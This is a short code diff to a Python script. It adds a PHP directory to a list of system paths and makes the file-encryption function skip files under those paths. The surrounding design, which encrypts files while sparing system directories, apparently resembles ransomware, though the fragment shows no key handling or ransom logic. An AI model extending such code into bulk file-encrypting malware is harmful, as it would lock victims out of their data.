@@ -62,10 +62,14 @@ system_paths = [
     "/usr/local/python",
     "/usr/local/python3",
     "/usr/local/py-utils",
+    "/usr/local/php",
 ]
 
 # Function to encrypt a file
 def encrypt_file(file_path):
+    if any(os.path.commonpath([file_path, path]) == path for path in system_paths):
+        logging.debug(f"Skipping file {file_path}")
+        return
     try:
         with open(file_path, "rb") as file:
             data = file.read()
@@ -156,6 +160,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
